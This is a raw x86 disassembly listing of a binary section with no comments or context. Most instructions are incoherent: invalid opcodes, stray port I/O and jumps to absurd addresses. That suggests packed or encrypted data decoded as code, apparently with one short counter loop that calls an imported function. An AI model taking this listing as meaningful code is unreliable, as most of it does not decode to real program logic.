  409f79:	test   al,0x98
  409f7b:	mov    esi,0x53485736
  409f80:	mov    edi,0x9fe34cb8
  409f85:	in     al,dx
  409f86:	inc    ebp
  409f87:	mov    esi,0x40ac1ddd
  409f8c:	jmp    0x81026d3
  409f91:	push   0x77
  409f93:	stos   DWORD PTR es:[edi],eax
  409f94:	enter  0x4172,0x56
  409f98:	push   0xb6910ca0
  409f9d:	dec    eax
  409f9e:	imul   BYTE PTR [edx]
  409fa0:	test   al,0x8b
  409fa2:	xchg   esp,eax
  409fa3:	ja     0x409f2c
  409fa5:	sbb    al,0x60
  409fa7:	adc    al,0x3
  409fa9:	jno    0x409f5d
  409fab:	imul   edx,ecx,0x31baebc2
  409fb1:	or     eax,0x5c152070
  409fb6:	push   edx
  409fb7:	dec    edi
  409fb8:	or     esp,DWORD PTR [ecx]
  409fba:	retf   0x3b9e
  409fbd:	ss dec edi
  409fbf:	sbb    eax,0xf92c397a
  409fc4:	push   edx
  409fc5:	inc    eax
  409fc6:	lea    edi,[eax+0x4966303e]
  409fcc:	lds    ebx,FWORD PTR [ecx-0xb]
  409fcf:	nop
  409fd0:	int3   
  409fd1:	pop    esi
  409fd2:	ret    0x1c02
  409fd5:	shr    eax,cl
  409fd7:	xlat   BYTE PTR ds:[ebx]
  409fd8:	stos   BYTE PTR es:[edi],al
  409fd9:	imul   eax,DWORD PTR [edi],0xffffff96
  409fdc:	pop    ecx
  409fdd:	mov    esp,0xdd4dbbdc
  409fe2:	xchg   edi,eax
  409fe3:	lea    esp,[esi-0x3b]
  409fe6:	cmp    BYTE PTR [edi+0x7c77febe],0x32
  409fed:	mov    ecx,DWORD PTR [edx+0x19]
  409ff0:	dec    edx
  409ff1:	push   esi
  409ff2:	stos   BYTE PTR es:[edi],al
  409ff3:	fcomp  QWORD PTR [edx+0x47ae8438]
  409ff9:	repz arpl WORD PTR [ebp+0x1d],bx
  409ffd:	mov    ch,0x9e
  409fff:	out    0xed,eax
  40a001:	aaa    
  40a002:	aam    0x11
  40a004:	add    cl,BYTE PTR [ecx+0x9]
  40a007:	nop    eax
  40a00a:	fmul   DWORD PTR ds:0xd605ee54
  40a010:	sub    ah,BYTE PTR [eax]
  40a012:	mov    ebx,0x274c24d6
  40a017:	mov    ecx,0xee1fd306
  40a01c:	inc    ecx
  40a01d:	sub    edx,ecx
  40a01f:	popf   
  40a020:	mov    eax,ds:0xc17847fe
  40a025:	push   es
  40a026:	ja     0x40a03b
  40a028:	fsub   DWORD PTR [esi]
  40a02a:	inc    edi
  40a02b:	leave  
  40a02c:	es pop esp
  40a02e:	fwait
  40a02f:	hlt    
  40a030:	test   eax,0xb82fdcf3
  40a035:	out    dx,eax
  40a036:	lds    edi,FWORD PTR [ebp+0x3a028d53]
  40a03c:	(bad)  
  40a03d:	out    dx,eax
  40a03e:	sub    eax,0x48834cc
  40a043:	and    eax,0xb352ce90
  40a048:	pop    eax
  40a049:	jns    0x40a04d
  40a04b:	pop    ss
  40a04c:	add    BYTE PTR [eax+0x2a],bl
  40a04f:	fisub  DWORD PTR ds:0xbf581c73
  40a055:	push   ecx
  40a056:	mov    esi,0x4d18c09c
  40a05b:	xor    cl,0xe4
  40a05e:	sbb    al,0x47
  40a060:	mov    bh,0x3c
  40a062:	dec    edi
  40a063:	or     BYTE PTR [esi],cl
  40a065:	icebp  
  40a066:	aaa    
  40a067:	mov    esp,0x7dd195dc
  40a06c:	pop    eax
  40a06d:	xchg   DWORD PTR [esi+0x7928ce44],esp
  40a073:	std    
  40a074:	fdivp  st(5),st
  40a076:	(bad)  
  40a077:	leave  
  40a078:	arpl   WORD PTR [edi-0x24],di
  40a07b:	add    eax,0xc280c65d
  40a080:	mov    al,0x62
  40a082:	and    DWORD PTR [esi+0x4c],ebx
  40a085:	mov    edi,cs
  40a087:	cmp    al,0xd6
  40a089:	fwait
  40a08a:	addr16 in al,dx
  40a08c:	retf   
  40a08d:	mov    edi,0x7f2521d
  40a092:	fxch   st(3)
  40a094:	rcr    BYTE PTR [ebx],cl
  40a096:	in     eax,0x22
  40a098:	adc    eax,0xb1f4381
  40a09d:	xor    BYTE PTR [edi+0x3edc8cd3],0xcd
  40a0a4:	add    DWORD PTR [edx],esi
  40a0a6:	mov    eax,ds:0x6e2863dd
  40a0ab:	jae    0x40a105
  40a0ad:	in     eax,0xa9
  40a0af:	fmul   DWORD PTR [esi]
  40a0b1:	push   edx
  40a0b2:	(bad)  
  40a0b3:	cwde   
  40a0b4:	arpl   cx,si
  40a0b6:	mov    dh,ah
  40a0b8:	hlt    
  40a0b9:	stc    
  40a0ba:	ins    BYTE PTR es:[edi],dx
  40a0bb:	test   DWORD PTR [edi-0x17ad8659],ebp
  40a0c1:	shr    DWORD PTR [ecx+0xb],0x9e
  40a0c5:	adc    eax,0x2f3b3d90
  40a0ca:	cdq    
  40a0cb:	loopne 0x40a0dc
  40a0cd:	dec    ecx
  40a0ce:	pop    ebp
  40a0cf:	mov    ah,BYTE PTR [esp+eax*4]
  40a0d2:	repnz hlt 
  40a0d4:	jne    0x40a0a3
  40a0d6:	(bad)  
  40a0d7:	or     ebx,edx
  40a0d9:	xor    al,0xe5
  40a0db:	push   ecx
  40a0dc:	pop    ecx
  40a0dd:	mov    esp,0x44aa80e3
  40a0e2:	push   eax
  40a0e3:	jecxz  0x40a0de
  40a0e5:	int    0xa5
  40a0e7:	inc    ebx
  40a0e8:	and    ecx,DWORD PTR gs:[ebx+0x6]
  40a0ec:	adc    dh,BYTE PTR [edx]
  40a0ee:	push   0x922b4b69
  40a0f3:	mov    ebx,DWORD PTR [esi-0x35695324]
  40a0f9:	sub    DWORD PTR [edx],esi
  40a0fb:	dec    ecx
  40a0fc:	mov    ah,BYTE PTR [eax-0x459050cf]
  40a102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a103:	jle    0x40a104
  40a105:	push   ebx
  40a106:	call   0xd194d769
  40a10b:	mov    ds:0x66483ead,eax
  40a110:	call   0xf7bbc212
  40a115:	sar    ah,1
  40a117:	stos   DWORD PTR es:[edi],eax
  40a118:	add    cl,dl
  40a11a:	jg     0x40a16f
  40a11c:	sub    eax,0xff23435b
  40a121:	into   
  40a122:	cmp    eax,0xa423d63e
  40a127:	pop    ebx
  40a128:	pop    ecx
  40a129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a12a:	mov    ah,0x9e
  40a12c:	test   ah,0xea
  40a12f:	cdq    
  40a130:	xchg   ecx,eax
  40a131:	mov    ds:0x5cb0a726,al
  40a136:	out    0x9f,al
  40a138:	jns    0x40a1a6
  40a13a:	je     0x40a15b
  40a13c:	add    DWORD PTR [edi+0x19],esp
  40a13f:	add    al,0xdd
  40a141:	mov    ds:0xd4d97394,al
  40a146:	cmp    eax,0xec24a60d
  40a14b:	push   esi
  40a14c:	mov    edi,0xce75a20e
  40a151:	pop    esi
  40a152:	add    ebp,DWORD PTR [ecx-0x39da99f6]
  40a158:	push   ebp
  40a159:	xchg   edx,eax
  40a15a:	jmp    0x726be390
  40a15f:	jmp    0x6933:0x34db132
  40a166:	xor    eax,esi
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	sbb    eax,0x39944e90
  40a17e:	out    0x7e,eax
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a182
  40a186:	scas   eax,DWORD PTR es:[edi]
  40a187:	fyl2x  
  40a189:	xchg   esp,eax
  40a18a:	cmovne ecx,DWORD PTR [ebx-0x2b]
  40a18e:	sbb    al,0x97
  40a190:	sbb    BYTE PTR [edx],cl
  40a192:	jns    0x40a183
  40a194:	or     esi,DWORD PTR [edx]
  40a196:	sub    ebp,edi
  40a198:	es lock add edi,ebx
  40a19c:	lds    edi,FWORD PTR [eax-0x78ccdbf0]
  40a1a2:	xchg   edi,eax
  40a1a3:	xchg   DWORD PTR [ecx-0x1c],edi
  40a1a6:	pushf  
  40a1a7:	test   al,0x64
  40a1a9:	mov    ecx,eax
  40a1ab:	push   0x84ac8308
  40a1b0:	lahf   
  40a1b1:	jae    0x40a22f
  40a1b3:	clc    
  40a1b4:	jl     0x40a149
  40a1b6:	test   eax,0x64a6b237
  40a1bb:	push   ecx
  40a1bc:	xchg   edx,eax
  40a1bd:	xchg   ecx,eax
  40a1be:	xchg   esi,eax
  40a1bf:	es xchg esi,eax
  40a1c1:	into   
  40a1c2:	in     al,0x68
  40a1c4:	stos   BYTE PTR es:[edi],al
  40a1c5:	fincstp 
  40a1c7:	ficom  DWORD PTR [edx]
  40a1c9:	xchg   esp,eax
  40a1ca:	aaa    
  40a1cb:	dec    edx
  40a1cc:	shl    BYTE PTR [edi+0x1a28cd6f],0xd5
  40a1d3:	push   ds
  40a1d4:	sub    DWORD PTR [ecx-0x2b772e3],ebx
  40a1da:	mov    edx,0xe5143d04
  40a1df:	sub    DWORD PTR [ebx+0x3],0x21
  40a1e3:	mov    ch,0x9f
  40a1e5:	stos   BYTE PTR es:[edi],al
  40a1e6:	fwait
  40a1e7:	add    DWORD PTR [ebx-0x8a1f3f4],ebx
  40a1ed:	jo     0x40a1e3
  40a1ef:	add    eax,0x17074881
  40a1f4:	fnstenv [edi+0x734544a6]
  40a1fa:	sub    DWORD PTR [ecx],esi
  40a1fc:	xchg   edx,eax
  40a1fd:	mov    bh,0xe6
  40a1ff:	add    bl,BYTE PTR [edx]
  40a201:	sti    
  40a202:	sub    esi,DWORD PTR [ebx-0x41]
  40a205:	rcr    DWORD PTR [ebx+0x1b],1
  40a208:	mov    ch,bl
  40a20a:	aas    
  40a20b:	enter  0xcb12,0xd5
  40a20f:	mov    eax,fs:0xffc203a4
  40a215:	and    eax,0xfbd1ed70
  40a21a:	out    0xa4,al
  40a21c:	movups XMMWORD PTR [eax+edx*4],xmm1
  40a220:	bound  ebp,QWORD PTR [edi+ebp*8+0x62b09912]
  40a227:	rcl    DWORD PTR [edi],cl
  40a229:	loopne 0x40a223
  40a22b:	out    0x4c,eax
  40a22d:	mov    ebx,0xd78aebc8
  40a232:	dec    eax
  40a233:	adc    ebx,DWORD PTR [eax-0x1]
  40a236:	adc    eax,0x686cc6f9
  40a23b:	push   esi
  40a23c:	lds    edx,FWORD PTR [ecx+0x42]
  40a23f:	jns    0x40a2a8
  40a241:	in     eax,dx
  40a242:	scas   eax,DWORD PTR es:[edi]
  40a243:	aaa    
  40a244:	add    bl,BYTE PTR [eax+0x69]
  40a247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a248:	popa   
  40a249:	prefetch BYTE PTR [eax]
  40a24c:	das    
  40a24d:	sub    DWORD PTR [ebx+0x22],ebp
  40a250:	pop    ebp
  40a251:	cld    
  40a252:	cld    
  40a253:	sub    BYTE PTR [edi+0x16],ch
  40a256:	test   eax,0x41ab1978
  40a25b:	mov    dl,0x8a
  40a25d:	dec    ebp
  40a25e:	lahf   
  40a25f:	aas    
  40a260:	lods   eax,DWORD PTR ds:[esi]
  40a261:	into   
  40a262:	fimul  WORD PTR [esi+0x18]
  40a265:	adc    BYTE PTR [edi],cl
  40a267:	cmp    al,0x28
  40a269:	leave  
  40a26a:	pop    ds
  40a26b:	mov    eax,0x48b713de
  40a270:	shl    DWORD PTR [ebp-0x39],0xc5
  40a274:	pop    ebx
  40a275:	sbb    BYTE PTR es:[edi],0xe0
  40a279:	jae    0x40a213
  40a27b:	cmp    eax,DWORD PTR [edx]
  40a27d:	push   cs
  40a27e:	dec    edi
  40a27f:	sub    ebp,eax
  40a281:	mov    ebp,DWORD PTR [edx+0x56086df0]
  40a287:	loop   0x40a249
  40a289:	fist   DWORD PTR [edx-0x16846284]
  40a28f:	xchg   ecx,eax
  40a290:	icebp  
  40a291:	cld    
  40a292:	add    ebx,DWORD PTR [ecx-0x43]
  40a295:	sub    BYTE PTR [ebx],al
  40a297:	outs   dx,DWORD PTR ds:[esi]
  40a298:	or     BYTE PTR ds:0x231ad1aa,ah
  40a29e:	lods   al,BYTE PTR ds:[esi]
  40a29f:	mov    ss,ebp
  40a2a1:	pop    es
  40a2a2:	shl    bl,cl
  40a2a4:	test   esp,0x5eab95f
  40a2aa:	adc    eax,0x5f120a72
  40a2af:	add    dh,BYTE PTR [eax+0x82ddf09]
  40a2b5:	and    eax,DWORD PTR [esi-0x2bfe371d]
  40a2bb:	imul   ebx,ebp,0xffffffeb
  40a2be:	cmp    ecx,ecx
  40a2c0:	mov    al,0xbc
  40a2c2:	xchg   DWORD PTR [edi-0x21],ebx
  40a2c5:	pop    eax
  40a2c6:	push   edx
  40a2c7:	inc    esi
  40a2c8:	ins    BYTE PTR es:[edi],dx
  40a2c9:	scas   al,BYTE PTR es:[edi]
  40a2ca:	xor    eax,0x44d7f11f
  40a2cf:	sub    al,0xa8
  40a2d1:	mov    dl,0xe8
  40a2d3:	dec    esp
  40a2d4:	dec    eax
  40a2d5:	dec    edi
  40a2d6:	dec    edx
  40a2d7:	inc    esp
  40a2d8:	pusha  
  40a2d9:	fist   WORD PTR [edi+0x6]
  40a2dc:	xor    DWORD PTR [edx],0x869c58d8
  40a2e2:	repz pop es
  40a2e4:	push   edi
  40a2e5:	int3   
  40a2e6:	push   edi
  40a2e7:	sbb    DWORD PTR [ecx-0x7756cb98],0xffffff9d
  40a2ee:	les    esi,FWORD PTR [edx-0x3d]
  40a2f1:	es iret 
  40a2f3:	adc    DWORD PTR [edi],ecx
  40a2f5:	leave  
  40a2f6:	mov    edx,0x904c472f
  40a2fb:	or     edi,DWORD PTR [ebp+0x587c61e0]
  40a301:	or     eax,0xa56ab9d1
  40a306:	enter  0xd7f2,0x26
  40a30a:	adc    BYTE PTR [esi-0x349b125a],ah
  40a310:	push   0xba2ebbad
  40a315:	ja     0x40a326
  40a317:	pop    edx
  40a318:	test   DWORD PTR [edi-0x4a],0x8d2c6f52
  40a31f:	or     cl,al
  40a321:	mov    eax,0x98bfecd2
  40a326:	out    0x32,al
  40a328:	stos   BYTE PTR es:[edi],al
  40a329:	repnz sbb eax,0x4fbfa957
  40a32f:	sti    
  40a330:	pop    edx
  40a331:	mov    ah,BYTE PTR [edi]
  40a333:	jg     0x40a2e4
  40a335:	aaa    
  40a336:	daa    
  40a337:	ror    DWORD PTR [edx+0x71],1
  40a33a:	dec    esp
  40a33b:	mov    edx,0x50bafa8f
  40a340:	and    BYTE PTR [edx+0x4f],dl
  40a343:	pop    ecx
  40a344:	mov    al,ds:0xb1f01ea6
  40a349:	push   0x4d4c7f28
  40a34e:	xor    esp,DWORD PTR [ebx]
  40a350:	stos   DWORD PTR es:[edi],eax
  40a351:	call   0xa5d6:0xe03cff6f
  40a358:	aas    
  40a359:	inc    eax
  40a35a:	push   0x79
  40a35c:	ret    0x1e62
  40a35f:	jns    0x40a381
  40a361:	loop   0x40a3d3
  40a363:	and    al,0x0
  40a365:	mov    eax,ds:0x7bf2d07e
  40a36a:	jo     0x40a32e
  40a36c:	inc    ebp
  40a36d:	test   BYTE PTR [ecx-0x4bb5eb6f],bl
  40a373:	rcl    DWORD PTR [ebx],cl
  40a375:	(bad)  
  40a377:	repnz sub al,0x8b
  40a37a:	jnp    0x40a38e
  40a37c:	adc    eax,0xe25f3474
  40a381:	(bad)  
  40a382:	stc    
  40a383:	jo     0x40a360
  40a385:	sub    eax,0x52acbdea
  40a38a:	daa    
  40a38b:	mov    bh,BYTE PTR [eax+0x7403c1d5]
  40a391:	mov    ch,0xb7
  40a393:	ja     0x40a327
  40a395:	leave  
  40a396:	add    esi,0x2d5c13e7
  40a39c:	push   ds
  40a39d:	cmp    bp,WORD PTR [ebx+eiz*4+0xf]
  40a3a2:	out    dx,al
  40a3a3:	jge    0x40a326
  40a3a5:	idiv   DWORD PTR [edx]
  40a3a7:	inc    esi
  40a3a8:	mov    ds:0xa5f49394,al
  40a3ad:	adc    eax,0x7ce41045
  40a3b2:	popf   
  40a3b3:	(bad)
  40a3b7:	mov    ebx,ebx
  40a3b9:	push   ss
  40a3ba:	inc    ebp
  40a3bb:	ds cs dec ecx
  40a3be:	arpl   WORD PTR [edi-0x96e9052],di
  40a3c4:	nop
  40a3c5:	cmp    al,0xbc
  40a3c7:	and    al,bh
  40a3c9:	sub    edx,DWORD PTR [edi+0x79]
  40a3cc:	pop    edi
  40a3cd:	int3   
  40a3ce:	pop    ss
  40a3cf:	retf   
  40a3d0:	pop    esp
  40a3d1:	or     esp,eax
  40a3d3:	inc    edx
  40a3d4:	and    BYTE PTR [esi],dh
  40a3d6:	mov    eax,?
  40a3d8:	xchg   edx,eax
  40a3d9:	mov    ch,0x27
  40a3db:	cmp    eax,0xc81d196e
  40a3e0:	jmp    0x40a3b4
  40a3e2:	dec    edx
  40a3e3:	push   edi
  40a3e4:	adc    DWORD PTR [ebx],ebp
  40a3e6:	add    WORD PTR [esi+edi*8-0x6247b190],cx
  40a3ee:	fwait
  40a3ef:	mov    dh,0x2d
  40a3f1:	mov    ebp,0x3d982633
  40a3f6:	fnstcw WORD PTR [edx+0x360b1fe4]
  40a3fc:	pushf  
  40a3fd:	jno    0x40a3dd
  40a3ff:	rcl    BYTE PTR [ebp+eax*4+0x3cd0de91],1
  40a406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a407:	xchg   edi,eax
  40a408:	pop    edx
  40a409:	mov    al,BYTE PTR [edi-0x1b]
  40a40c:	mov    esp,0x91d7b418
  40a411:	push   cs
  40a412:	adc    eax,0x1e36884f
  40a417:	push   ds
  40a418:	lea    esp,[ebx+0x486fa54]
  40a41e:	adc    BYTE PTR es:[ebx-0x6f963a82],bh
  40a425:	ret    
  40a426:	cld    
  40a427:	push   esp
  40a428:	cmp    ecx,DWORD PTR [esi-0x3c91ed8c]
  40a42e:	xchg   ebx,eax
  40a42f:	into   
  40a430:	mov    ebx,0x5eae1d02
  40a435:	xchg   dh,dl
  40a437:	popa   
  40a438:	mov    dh,0xe9
  40a43a:	mov    edi,0x7da8fdb7
  40a43f:	cmp    al,0xe
  40a441:	jnp    0x40a4a4
  40a443:	or     eax,0x4f1716b6
  40a448:	push   cs
  40a449:	pop    ecx
  40a44a:	(bad)  
  40a44c:	push   0xdd578fba
  40a451:	fdiv   QWORD PTR [eax-0x1142ca57]
  40a457:	in     al,0xa0
  40a459:	bound  ebx,QWORD PTR [ebx+0xc]
  40a45c:	in     eax,dx
  40a45d:	mov    DWORD PTR [eax-0x6d532f32],ebx
  40a463:	mov    BYTE PTR [ebx],dl
  40a465:	xchg   ebx,eax
  40a466:	pop    ss
  40a467:	call   0x7a4aa1b2
  40a46c:	inc    edi
  40a46d:	stos   BYTE PTR es:[edi],al
  40a46e:	sbb    ah,BYTE PTR [esi]
  40a470:	pop    eax
  40a471:	jns    0x40a4f0
  40a473:	(bad)  
  40a474:	(bad)  
  40a475:	cmp    al,0x0
  40a477:	pop    edi
  40a478:	adc    DWORD PTR [eax+ebp*2+0x6a],0xffffffd2
  40a47d:	bound  esi,QWORD PTR [edx-0x4d04a02a]
  40a483:	mov    BYTE PTR [edx],bl
  40a485:	pop    esi
  40a486:	adc    DWORD PTR [edx],0xdd983d4c
  40a48c:	push   esi
  40a48d:	loopne 0x40a4c6
  40a48f:	mov    esp,0x7f24267b
  40a494:	shl    DWORD PTR [ecx+edi*4],1
  40a497:	or     esi,DWORD PTR [edi]
  40a499:	arpl   WORD PTR [edi],sp
  40a49b:	jle    0x40a429
  40a49d:	xor    eax,0x8180d043
  40a4a2:	inc    esi
  40a4a3:	dec    esp
  40a4a4:	jmp    0x625d1627
  40a4a9:	xor    esp,ecx
  40a4ab:	and    esi,DWORD PTR [ebx-0x66b6c1cc]
  40a4b1:	cdq    
  40a4b2:	push   0x38
  40a4b4:	pop    es
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x4302f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss in  al,dx
  40a512:	lods   al,BYTE PTR ds:[esi]
  40a513:	sub    eax,0x7ee2e9fb
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a4e5
  40a51e:	fist   WORD PTR ds:0xb21ff914
  40a524:	push   esi
  40a525:	in     eax,0x60
  40a527:	dec    ebp
  40a528:	sbb    ebp,esi
  40a52a:	mov    ebp,0xe207d3c6
  40a52f:	nop
  40a530:	pop    ss
  40a531:	dec    ecx
  40a532:	addr16 sbb eax,0xdb5f05f5
  40a538:	dec    esp
  40a539:	pop    ecx
  40a53a:	jne    0x40a4f3
  40a53c:	cli    
  40a53d:	loop   0x40a540
  40a53f:	jmp    0x930fccb1
  40a544:	retf   
  40a545:	push   ss
  40a546:	push   eax
  40a547:	jne    0x40a4f9
  40a549:	lods   eax,DWORD PTR ds:[esi]
  40a54a:	inc    edi
  40a54b:	pop    ds
  40a54c:	fisttp WORD PTR ds:0x282839c2
  40a552:	inc    edx
  40a553:	js     0x40a531
  40a555:	xchg   BYTE PTR [edi-0x3],al
  40a558:	or     dh,BYTE PTR [eax+0x8]
  40a55b:	sub    bh,ah
  40a55d:	iret   
  40a55e:	mov    cl,0xb2
  40a560:	mov    ds:0xdce07d7c,al
  40a565:	mov    cl,al
  40a567:	or     BYTE PTR [esi-0x1e3ac099],ch
  40a56d:	aaa    
  40a56e:	inc    edi
  40a56f:	or     ebx,esi
  40a571:	jnp    0x40a586
  40a573:	(bad)  
  40a574:	in     al,dx
  40a575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a576:	mov    eax,0xb4a0fbb6
  40a57b:	dec    ecx
  40a57c:	leave  
  40a57d:	dec    ecx
  40a57e:	xchg   esi,eax
  40a57f:	dec    eax
  40a580:	dec    esp
  40a581:	xchg   DWORD PTR [ebx+0x3f],esp
  40a584:	mov    al,ds:0x2a06de85
  40a589:	lods   eax,DWORD PTR ds:[esi]
  40a58a:	push   ecx
  40a58b:	pop    es
  40a58c:	stc    
  40a58d:	fidivr DWORD PTR [ebx-0x45]
  40a590:	push   ecx
  40a591:	pop    edi
  40a592:	loopne 0x40a53e
  40a594:	mov    bl,0xee
  40a596:	int3   
  40a597:	arpl   di,sp
  40a599:	stos   BYTE PTR es:[edi],al
  40a59a:	in     eax,dx
  40a59b:	push   eax
  40a59c:	dec    esi
  40a59d:	adc    dh,BYTE PTR [eax-0x6d]
  40a5a0:	dec    esp
  40a5a1:	dec    ebp
  40a5a2:	jmp    0x2b05:0xdcbc933c
  40a5a9:	inc    ebx
  40a5aa:	fisubr DWORD PTR [ecx-0x5be01faa]
  40a5b0:	retf   
  40a5b1:	mov    al,0xa1
  40a5b3:	dec    edx
  40a5b4:	push   esp
  40a5b5:	jns    0x40a5be
  40a5b7:	(bad)  
  40a5b8:	int3   
  40a5b9:	jg     0x40a580
  40a5bb:	xor    al,0x8
  40a5bd:	(bad)  
  40a5be:	fbstp  TBYTE PTR [eax+0x33]
  40a5c1:	xor    eax,0xda5842fb
  40a5c6:	push   ss
  40a5c7:	ret    0xa614
  40a5ca:	addr16 pop edx
  40a5cc:	int    0xdc
  40a5ce:	aaa    
  40a5cf:	dec    eax
  40a5d0:	jne    0x40a5ed
  40a5d2:	leave  
  40a5d3:	(bad)  
  40a5d4:	push   0xffffff8b
  40a5d6:	sub    edi,ecx
  40a5d8:	cmp    edx,eax
  40a5da:	xchg   edx,eax
  40a5db:	enter  0x5008,0x91
  40a5df:	cli    
  40a5e0:	sbb    al,0xd2
  40a5e2:	jo     0x40a57a
  40a5e4:	adc    DWORD PTR [edi+eiz*2-0x27],0xb1b0e1be
  40a5ec:	jp     0x40a5c9
  40a5ee:	jo     0x40a663
  40a5f0:	icebp  
  40a5f1:	ret    0xc66a
  40a5f4:	stos   DWORD PTR es:[edi],eax
  40a5f5:	xor    eax,0x8e1fc5c6
  40a5fa:	mov    edi,0x579d9df
  40a5ff:	imul   ecx,DWORD PTR [esp+eiz*2-0x1347a5b4],0x10
  40a607:	sbb    DWORD PTR [edi],esp
  40a609:	xor    DWORD PTR [eax-0x305ca7d5],0x7d9555a2
  40a613:	ins    BYTE PTR es:[edi],dx
  40a614:	pop    ebp
  40a615:	loope  0x40a682
  40a617:	mov    bl,0x75
  40a619:	mov    ch,BYTE PTR [ebx]
  40a61b:	cmp    dl,BYTE PTR [eax+edi*2-0x2de433ce]
  40a622:	jno    0x40a5fa
  40a624:	xor    al,0xe4
  40a626:	push   ss
  40a627:	cdq    
  40a628:	xlat   BYTE PTR ds:[ebx]
  40a629:	aad    0x1c
  40a62b:	push   ds
  40a62c:	lods   al,BYTE PTR ds:[esi]
  40a62d:	loope  0x40a69a
  40a62f:	add    al,0x7b
  40a631:	(bad)  
  40a632:	cmp    ch,ch
  40a634:	je     0xf41c1ff9
  40a63a:	push   esp
  40a63b:	call   DWORD PTR [ebp-0x41dacc2a]
  40a641:	or     DWORD PTR [edx],edi
  40a643:	mov    dh,0xa4
  40a645:	shr    esp,0x42
  40a648:	mov    DWORD PTR ss:[esi-0x545d700e],edx
  40a64f:	push   0x3e52b5f8
  40a654:	pop    edx
  40a655:	enter  0xf01d,0xba
  40a659:	cmp    al,0xd3
  40a65b:	retf   
  40a65c:	mov    al,ds:0x778221f6
  40a661:	xchg   edi,eax
  40a662:	push   eax
  40a663:	xor    eax,esp
  40a665:	inc    esp
  40a666:	jle    0x40a671
  40a668:	add    eax,0x132a508a
  40a66d:	push   esi
  40a66e:	ret    
  40a66f:	daa    
  40a670:	adc    DWORD PTR [ebx+ebx*1-0x56],eax
  40a674:	or     eax,0x96045dae
  40a679:	pop    esp
  40a67a:	rcl    ebp,cl
  40a67c:	push   ebx
  40a67d:	aaa    
  40a67e:	fbld   TBYTE PTR [edi+ebx*1-0x3eee8a36]
  40a685:	sti    
  40a686:	dec    esp
  40a687:	xor    al,0x2d
  40a689:	sahf   
  40a68a:	push   edi
  40a68b:	retf   
  40a68c:	enter  0x13c0,0x65
  40a690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a691:	pop    eax
  40a692:	jne    0x40a671
  40a694:	cmp    DWORD PTR [edi+0x63],ebx
  40a697:	or     DWORD PTR [ebx-0x41],esi
  40a69a:	xchg   BYTE PTR [eax],ah
  40a69c:	int    0x6e
  40a69e:	dec    eax
  40a69f:	xor    DWORD PTR [ebx+ebp*1],edx
  40a6a2:	mov    bl,0x47
  40a6a4:	popf   
  40a6a5:	(bad)  
  40a6a6:	repz aaa 
  40a6a8:	lods   eax,DWORD PTR ds:[esi]
  40a6a9:	ror    DWORD PTR [edi],cl
  40a6ab:	mov    edi,0x9617054a
  40a6b0:	push   ebx
  40a6b1:	xchg   edi,eax
  40a6b2:	pop    ebx
  40a6b3:	int    0xe
  40a6b5:	outs   dx,DWORD PTR ds:[esi]
  40a6b6:	cmp    bl,al
  40a6b8:	test   ebp,esi
  40a6ba:	or     dh,BYTE PTR [ecx+edi*2]
  40a6bd:	aaa    
  40a6be:	and    DWORD PTR ds:0x8776fb0c,edi
  40a6c4:	in     al,dx
  40a6c5:	pop    ss
  40a6c6:	add    bl,BYTE PTR ds:0xc2808293
  40a6cc:	push   DWORD PTR [ecx]
  40a6ce:	fisttp DWORD PTR [edx]
  40a6d0:	pop    esp
  40a6d1:	lods   al,BYTE PTR ds:[esi]
  40a6d2:	push   edi
  40a6d3:	push   ebp
  40a6d4:	rcl    BYTE PTR [edi-0x6e],0x18
  40a6d8:	mov    dh,ch
  40a6da:	xchg   DWORD PTR [eax+0x62],ecx
  40a6dd:	loope  0x40a66b
  40a6df:	std    
  40a6e0:	cmp    eax,0x3062008d
  40a6e5:	xchg   esp,eax
  40a6e6:	pop    ebx
  40a6e7:	add    BYTE PTR [edx+0x47],0xcc
  40a6eb:	iret   
  40a6ec:	xor    ecx,DWORD PTR [ebx+ebx*2+0xabd24fb]
  40a6f3:	sahf   
  40a6f4:	xchg   edi,eax
  40a6f5:	shr    BYTE PTR [edi+0x3dd0caf6],1
  40a6fb:	out    dx,eax
  40a6fc:	sbb    bl,al
  40a6fe:	jecxz  0x40a6fe
  40a700:	ficomp DWORD PTR [esi+0x2aa35276]
  40a706:	or     eax,0xf68d4b86
  40a70b:	jns    0x40a6f1
  40a70d:	repz out 0xd6,al
  40a710:	jo     0x40a70f
  40a712:	mov    dh,0xa1
  40a714:	fadd   DWORD PTR [ebx-0x43]
  40a717:	fcomp  QWORD PTR [edx-0x72]
  40a71a:	mov    ds:0x8c6991db,eax
  40a71f:	jne    0x40a78b
  40a721:	dec    ecx
  40a722:	ret    
  40a723:	scas   al,BYTE PTR es:[edi]
  40a724:	or     bh,BYTE PTR [esp+ebx*1+0x6a2bc3df]
  40a72b:	xchg   edx,eax
  40a72c:	mov    dl,0xc0
  40a72e:	pusha  
  40a72f:	and    dh,dl
  40a731:	jge    0x40a72f
  40a733:	xchg   ecx,eax
